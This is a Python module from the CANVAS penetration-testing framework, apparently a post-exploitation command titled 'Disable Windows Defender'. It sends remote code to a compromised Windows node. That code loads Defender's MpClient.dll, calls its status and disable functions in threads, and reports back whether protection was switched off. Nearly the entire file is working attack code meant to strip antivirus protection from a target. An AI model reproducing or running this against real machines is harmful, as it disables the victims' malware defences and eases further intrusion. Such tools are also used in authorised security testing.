#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2008
#http://www.immunityinc.com/CANVAS/ for more information

import sys
#covers both angles
if "." not in sys.path:
    sys.path.append(".")

import os,getopt
import socket
from exploitutils import *
import canvasengine
import time
from canvasexploit import canvasexploit

NAME                = "Disable Windows Defender"
DESCRIPTION         = "Weakness where the Windows Defender API allows you to zero out a flag that bypasses a code signing check. This allows unsigned code to disable Windows Defender."
VERSION             = "1.0"

DOCUMENTATION       = {}

PROPERTY            = {}
PROPERTY['TYPE']    = "Commands"
PROPERTY['SITE']    = "Local"
PROPERTY['ARCH']    = [ ["Windows"] ]

class theexploit(canvasexploit):
    def __init__(self):
        canvasexploit.__init__(self)
        self.result         = ""
        self.name           = NAME
        self.defender_path  = "C:\\Program Files\\Windows Defender\\MpClient.dll"
        self.disable_func   = "WDEnable"
        self.check_func     = "WDStatus"
        return
            
    def DisableWindowsDefenderCode( self ):
        vars={}
        vars["WD_DLL"]      = self.defender_path
        vars["WD_Func"]     = self.disable_func
        vars["WD_Check"]    = self.check_func
        
        disable_code = """
        #import "remote", "kernel32|LoadLibraryA" as "LoadLibraryA"
        #import "remote", "kernel32|GetProcAddress" as "GetProcAddressA"
        #import "remote", "kernel32|CreateThread" as "CreateThread"
        #import "remote", "kernel32|TerminateThread" as "TerminateThread"
        #import "remote", "kernel32|CloseHandle" as "CloseHandle"
        #import "remote", "kernel32|Sleep" as "Sleep"
        #import "string", "WD_DLL" as "WD_DLL"
        #import "string", "WD_Func" as "WD_Func"
        #import "string", "WD_Check" as "WD_Check"
        
        #import "local", "sendint" as "sendint"
        
        void main()
        {
          int hDll;
          int disableFunc;
          int result;
          int disableCode;
          unsigned int checkResult;
          int checkFunc;
          
          checkResult = 2;
          hDll = LoadLibraryA(WD_DLL);          
          disableCode = 0;
          
          if(hDll)
          { 
            disableFunc = GetProcAddressA(hDll, WD_Func);
            checkFunc   = GetProcAddressA(hDll, WD_Check );
            result = CreateThread( 0, 0, checkFunc, &checkResult, 0, 0 );
            
            // Buy our thread a little time
            Sleep(2000);
            
            if( checkResult )
            {
              // Its turned on, so flip it off! Kill the original thread first
              // Close the thread handle too
              TerminateThread( result, &checkResult );
              CloseHandle( result );
              
              result = CreateThread( 0, 0, disableFunc, disableCode, 0, 0 );
              
              Sleep( 2000 );
              
              if( result )
              {
                TerminateThread( result, &checkResult );
                CloseHandle( result );
                
                // Now we can check again kill the previous thread first
                // Close the thread handle too
                result = CreateThread( 0, 0, checkFunc, &checkResult, 0 , 0 );
                
                Sleep(2000);
                
                if( checkResult )
                {
                  // It's still running so send back the flag :(
                  sendint(2);
                  TerminateThread( result, &checkResult );
                  CloseHandle( result );
                  CloseHandle( hDll );
                  return;
                }else{
                
                  // Sweet we managed to turn it off
                  sendint(1);
                  TerminateThread( result, &checkResult );
                  CloseHandle( result );
                  CloseHandle( hDll );
                  return;
                }
                
              }else{
                
                // Couldn't get a result back
                sendint(-1);
                CloseHandle( hDll );
                return;
            }
               
                
            }else{
            
              // It's already turned off no need to do anything
              sendint( 3 );
              TerminateThread( result, &checkResult );
              CloseHandle( result );
              CloseHandle( hDll );
              return;
            }
        }
        
        sendint(-1);
        CloseHandle( hDll );
        return;
        }
            """
        
        return self.node.shell.runCode(disable_code, vars)
                        
    def run(self):
        self.setInfo("%s (in progress)" % (NAME))

        node        = self.argsDict["passednodes"][0]
        self.result = []

        self.log("Once we acquire all function addresses, we sleep. Wait for 10 seconds or so.....")
        
        for node in self.argsDict["passednodes"]:
            self.node       = node
            nodetype        = node.nodetype
            capabilities    = node.capabilities

            if "win32api" in capabilities:
                   
                ret = self.DisableWindowsDefenderCode()
                self.log("Return result: 0x%08x" % ret)
                self.result += [ret]
                if ret:
                    if ret == 3:
                        self.log("Windows Defender was already disabled. Skipping.")
                    else:
                        self.log("Successfully disabled Windows Defender. 0x%08x" % ret)
                else:
                    self.log("Couldn't turn off Windows Defender, make sure you have Administrator privileges.")
            else:
                self.log("The node named %s of type %s does not have the capabilities needed to run this command"%(node.get_name(),nodetype))
                self.result += [0]
                
        if 1 in self.result:
            ret = 1
        else:
            ret = 0

        self.dispshellcmd = self.command
        self.setInfo("%s - (finished)" % (NAME))
        return ret

